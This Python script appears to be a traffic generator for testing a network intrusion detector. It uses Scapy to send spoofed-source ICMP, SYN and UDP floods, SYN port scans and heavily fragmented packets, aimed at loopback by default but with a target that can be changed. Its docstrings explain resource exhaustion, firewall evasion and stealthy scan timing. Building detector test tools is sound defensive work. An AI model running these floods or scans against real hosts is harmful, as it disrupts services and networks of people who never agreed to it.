"""
attack_injector.py

NOW SUPPORTS FIVE ATTACK TYPES:
  1. icmp_flood      — ICMP ping flood (original)
  2. syn_flood       — TCP SYN flood
  3. udp_flood       — UDP packet burst
  4. port_scan       — Sequential port probing
  5. fragmentation   — Fragmented IP packets

ALL attacks target loopback (127.0.0.1) by default.
ALL are safe — they do not leave your machine.

Usage examples:
  python attack_injector.py --attack icmp_flood
  python attack_injector.py --attack syn_flood   --rate 80
  python attack_injector.py --attack udp_flood   --rate 150
  python attack_injector.py --attack port_scan   --ports 100
  python attack_injector.py --attack fragmentation
  python attack_injector.py --attack all         --duration 5
"""

import time
import random
import argparse
import logging

from scapy.all import (
    send,
    IP, TCP, UDP, ICMP,
    fragment,
    Raw
)

logger = logging.getLogger("injector")

def _auto_detect_interface() -> str:
    """Finds the Npcap Loopback Adapter for Windows."""
    try:
        from scapy.all import get_if_list
        for iface in get_if_list():
            if 'Loopback' in iface or 'loopback' in iface:
                logger.info(f"Auto-detected loopback interface: {iface}")
                return iface
    except Exception as e:
        logger.warning(f"Interface auto-detection failed: {e}")
    return None

def _send_pkt(pkt):
    """Reliably sends a packet on Windows loopback."""
    iface = _auto_detect_interface()
    if iface:
        send(pkt, iface=iface, verbose=False)
    else:
        send(pkt, verbose=False)

# Updated to use RFC 5737 TEST-NET addresses instead of loopback
# This prevents the "refusing to block loopback" error
FAKE_ATTACKER_IP = "203.0.113.50"  # RFC 5737 TEST-NET-3 (safe for testing)
TARGET_IP        = "127.0.0.1"


# ==============================================================================
# Attack 1: ICMP Flood
# ==============================================================================

def inject_icmp_flood(
    source_ip: str = FAKE_ATTACKER_IP,
    target_ip: str = TARGET_IP,
    rate:      int = 150,
    duration:  int = 10
):
    """
    Sends ICMP echo request packets at the specified rate.
    This is the simplest flood — just overwhelming the target
    with ping requests.

    The detector triggers at >20 ICMP packets/second.
    Default rate=150 guarantees a trigger.
    """
    print(f"\n[ICMP FLOOD] {source_ip} -> {target_ip}")
    print(f"  Rate: {rate} pps | Duration: {duration}s")
    print(f"  Expected trigger: ~{20/rate:.1f}s into the attack\n")

    interval      = 1.0 / rate
    total_packets = rate * duration

    for i in range(total_packets):
        if shared_should_stop():
            break

        pkt = IP(src=source_ip, dst=target_ip) / ICMP()
        _send_pkt(pkt)

        if i % rate == 0:
            print(f"  [{i}/{total_packets}] ICMP packets sent...")

        time.sleep(interval)

    print(f"  ICMP Flood complete.")


# ==============================================================================
# Attack 2: SYN Flood
# ==============================================================================

def inject_syn_flood(
    source_ip: str = FAKE_ATTACKER_IP,
    target_ip: str = TARGET_IP,
    target_port: int = 80,
    rate:  int = 80,
    duration: int = 10
):
    """
    Sends TCP packets with ONLY the SYN flag set (flags=0x02).
    Never sends the ACK to complete the handshake.

    Why this is dangerous at lower rates than ICMP:
    Each SYN causes the target to:
      1. Allocate memory for a half-open connection
      2. Send a SYN-ACK response
      3. Start a timer waiting for ACK (never comes)
      4. Hold that connection slot for ~30-120 seconds

    So 50 SYN/sec = 50 * 75sec = 3,750 wasted connection slots
    Most servers max out around 1,000-65,000 connections.

    flags=0x02 breakdown:
      0x01 = FIN
      0x02 = SYN  ← only this bit set
      0x04 = RST
      0x08 = PSH
      0x10 = ACK  ← NOT set (that would be SYN-ACK, a normal response)
    """
    print(f"\n[SYN FLOOD] {source_ip} -> {target_ip}:{target_port}")
    print(f"  Rate: {rate} pps | Duration: {duration}s")
    print(f"  TCP Flags: 0x02 (SYN only)")
    print(f"  Expected trigger: ~{20/rate:.1f}s into the attack\n")

    interval      = 1.0 / rate
    total_packets = rate * duration

    for i in range(total_packets):
        if shared_should_stop():
            break

        # Random source port makes it look like many different connections
        src_port = random.randint(1024, 65535)

        pkt = (
            IP(src=source_ip, dst=target_ip) /
            TCP(
                sport=src_port,
                dport=target_port,
                flags=0x02,             # SYN only — critical
                seq=random.randint(0, 2**32 - 1)
            )
        )
        _send_pkt(pkt)

        if i % rate == 0:
            print(f"  [{i}/{total_packets}] SYN packets sent...")

        time.sleep(interval)

    print(f"  SYN Flood complete.")


# ==============================================================================
# Attack 3: UDP Flood
# ==============================================================================

def inject_udp_flood(
    source_ip:   str = FAKE_ATTACKER_IP,
    target_ip:   str = TARGET_IP,
    rate:        int = 150,
    duration:    int = 10,
    payload_size: int = 512
):
    """
    Sends UDP packets to random destination ports.

    Why random ports?
    - Target must check each port for a listening application
    - Finds nothing, sends ICMP "port unreachable" back
    - This creates traffic in BOTH directions from just the attacker's outbound

    payload_size=512:
    Larger payloads consume more bandwidth.
    512 bytes is large enough to cause real bandwidth pressure
    but small enough to avoid IP fragmentation on most networks.
    (Ethernet MTU is 1500 bytes — we stay well under it)
    """
    print(f"\n[UDP FLOOD] {source_ip} -> {target_ip} (random ports)")
    print(f"  Rate: {rate} pps | Duration: {duration}s")
    print(f"  Payload: {payload_size} bytes per packet\n")

    interval      = 1.0 / rate
    total_packets = rate * duration

    # Pre-generate random payload to avoid CPU overhead in the loop
    payload = Raw(b"X" * payload_size)

    for i in range(total_packets):
        if shared_should_stop():
            break

        dst_port = random.randint(1, 65535)

        pkt = (
            IP(src=source_ip, dst=target_ip) /
            UDP(sport=random.randint(1024, 65535), dport=dst_port) /
            payload
        )
        _send_pkt(pkt)

        if i % rate == 0:
            print(f"  [{i}/{total_packets}] UDP packets sent to random ports...")

        time.sleep(interval)

    print(f"  UDP Flood complete.")


# ==============================================================================
# Attack 4: Port Scan
# ==============================================================================

def inject_port_scan(
    source_ip:  str = FAKE_ATTACKER_IP,
    target_ip:  str = TARGET_IP,
    start_port: int = 1,
    num_ports:  int = 100,
    delay:      float = 0.05    # 50ms between probes
):
    """
    Probes sequential TCP ports — simulates nmap-style scanning.

    Why attackers do this:
    Find open ports -> know what services are running ->
    research vulnerabilities for those services -> attack

    Three scan types simulated here:
      SYN scan (half-open): Send SYN, don't complete handshake
        - Open port:   responds SYN-ACK
        - Closed port: responds RST
        - Filtered:    no response (firewall dropped)
      This is stealthier than a full connect scan.

    delay=0.05 (50ms):
    Our detector uses a 5-second window and triggers at 10 unique ports.
    At 50ms per port: 10 ports takes 0.5 seconds -> well within the 5s window.
    This guarantees a trigger for testing.

    For a real stealth scan you would use delay=10.0 (10 seconds per port).
    That would take 16 minutes to scan 100 ports — harder to detect.
    """
    end_port = start_port + num_ports - 1

    print(f"\n[PORT SCAN] {source_ip} -> {target_ip}")
    print(f"  Scanning ports {start_port} to {end_port}")
    print(f"  Delay: {delay}s per port ({1/delay:.0f} ports/sec)")
    print(f"  Expected trigger: ~{10 * delay:.1f}s into the scan\n")

    for port in range(start_port, end_port + 1):
        if shared_should_stop():
            break

        # SYN scan packet — same flags as SYN flood but targeting different ports
        pkt = (
            IP(src=source_ip, dst=target_ip) /
            TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags=0x02    # SYN only
            )
        )
        _send_pkt(pkt)

        if port % 10 == 0:
            print(f"  Scanned up to port {port}...")

        time.sleep(delay)

    print(f"  Port scan complete. Probed {num_ports} ports.")


# ==============================================================================
# Attack 5: IP Fragmentation
# ==============================================================================

def inject_fragmentation_attack(
    source_ip: str = FAKE_ATTACKER_IP,
    target_ip: str = TARGET_IP,
    rate:      int = 50,
    duration:  int = 10
):
    """
    Sends intentionally fragmented IP packets.

    How IP fragmentation works:
    IP packets have a maximum size (MTU — typically 1500 bytes on Ethernet).
    If a packet is larger, it gets broken into fragments.
    The receiver must reassemble them.

    How this is used as an attack:
    1. Firewall Evasion: Some firewalls only inspect the first fragment
       (which contains the TCP/UDP header). Malicious payload goes in
       later fragments that the firewall never checks.

    2. Reassembly exhaustion: Sending thousands of incomplete fragment sets.
       The target holds fragment buffers open waiting for missing pieces.
       Memory exhaustion.

    3. Teardrop: Overlapping fragment offsets crash old TCP/IP stacks.
       (Modern OSes are patched against this — safe to test.)

    We use Scapy's fragment() function which takes a large packet
    and splits it into properly formatted IP fragments.

    fragsize=8:
    This creates VERY small fragments (8 bytes each).
    A normal packet might produce 1-2 fragments.
    Our 1000-byte payload with fragsize=8 produces ~125 fragments per packet.
    This maximizes reassembly work on the target.
    """
    print(f"\n[FRAGMENTATION] {source_ip} -> {target_ip}")
    print(f"  Rate: {rate} packets/sec | Duration: {duration}s")
    print(f"  Fragment size: 8 bytes (maximum fragmentation)\n")

    interval = 1.0 / rate
    total    = rate * duration

    # Large payload to force many fragments
    large_payload = Raw(b"A" * 1000)

    for i in range(total):
        if shared_should_stop():
            break

        # Build a large packet then fragment it
        large_pkt = (
            IP(src=source_ip, dst=target_ip) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)) /
            large_payload
        )

        # fragment() splits into multiple IP packets
        # fragsize=8 means each fragment carries 8 bytes of data
        # This creates extreme fragmentation
        fragments = fragment(large_pkt, fragsize=8)

        for frag in fragments:
            _send_pkt(frag)

        if i % rate == 0:
            print(f"  [{i}/{total}] Sent {len(fragments)} fragments per packet...")

        time.sleep(interval)

    print(f"  Fragmentation attack complete.")


# ==============================================================================
# Attack All — run all five in sequence
# ==============================================================================

def inject_all(duration_each: int = 5):
    """
    Runs all five attacks in sequence.
    Each runs for duration_each seconds.
    Good for a full demo of all detectors triggering.
    """
    print("\n" + "="*50)
    print("RUNNING ALL ATTACK TYPES IN SEQUENCE")
    print("="*50)

    attacks = [
        ("ICMP Flood",      lambda: inject_icmp_flood(duration=duration_each)),
        ("SYN Flood",       lambda: inject_syn_flood(duration=duration_each)),
        ("UDP Flood",       lambda: inject_udp_flood(duration=duration_each)),
        ("Port Scan",       lambda: inject_port_scan(num_ports=50)),
        ("Fragmentation",   lambda: inject_fragmentation_attack(duration=duration_each)),
    ]

    for name, attack_fn in attacks:
        print(f"\n{'='*30}")
        print(f"Starting: {name}")
        print(f"{'='*30}")
        attack_fn()
        print(f"Waiting 5 seconds before next attack...")
        time.sleep(5)   # Give the detector cooldown time

    print("\nAll attacks complete.")


# ==============================================================================
# Shared stop flag — lets Ctrl+C cleanly stop mid-injection
# ==============================================================================

_should_stop = False

def shared_should_stop() -> bool:
    return _should_stop


# ==============================================================================
# CLI Entry Point
# ==============================================================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s")
    parser = argparse.ArgumentParser(
        description="Network Attack Simulator — loopback only, safe for testing"
    )

    parser.add_argument(
        "--attack",
        choices=["icmp_flood", "syn_flood", "udp_flood", "port_scan", "fragmentation", "all"],
        default="icmp_flood",
        help="Which attack type to simulate"
    )
    parser.add_argument("--source",   default=FAKE_ATTACKER_IP, help="Fake source IP (uses RFC 5737 TEST-NET)")
    parser.add_argument("--target",   default=TARGET_IP,        help="Target IP (keep as 127.0.0.1)")
    parser.add_argument("--rate",     type=int, default=150,     help="Packets per second")
    parser.add_argument("--duration", type=int, default=10,      help="Duration in seconds")
    parser.add_argument("--ports",    type=int, default=100,     help="Number of ports to scan")

    args = parser.parse_args()

    print(f"""
╔══════════════════════════════════════════╗
║     NETWORK GUARDIAN ATTACK INJECTOR     ║
║     LOOPBACK ONLY — SAFE FOR TESTING     ║
╚══════════════════════════════════════════╝
  Target:   {args.target} (loopback — your machine only)
  Attacker: {args.source} (RFC 5737 TEST-NET)
  Attack:   {args.attack}
  
  NOTE: Using RFC 5737 test IP to avoid loopback blocking issues.
        Set ALLOW_LOOPBACK_BLOCK=true in the defender to enable blocking.
""")

    try:
        if args.attack == "icmp_flood":
            inject_icmp_flood(
                source_ip=args.source,
                target_ip=args.target,
                rate=args.rate,
                duration=args.duration
            )
        elif args.attack == "syn_flood":
            inject_syn_flood(
                source_ip=args.source,
                target_ip=args.target,
                rate=args.rate,
                duration=args.duration
            )
        elif args.attack == "udp_flood":
            inject_udp_flood(
                source_ip=args.source,
                target_ip=args.target,
                rate=args.rate,
                duration=args.duration
            )
        elif args.attack == "port_scan":
            inject_port_scan(
                source_ip=args.source,
                target_ip=args.target,
                num_ports=args.ports
            )
        elif args.attack == "fragmentation":
            inject_fragmentation_attack(
                source_ip=args.source,
                target_ip=args.target,
                rate=args.rate,
                duration=args.duration
            )
        elif args.attack == "all":
            inject_all(duration_each=args.duration)

    except KeyboardInterrupt:
        _should_stop = True
        print("\n\nInjection stopped by user.")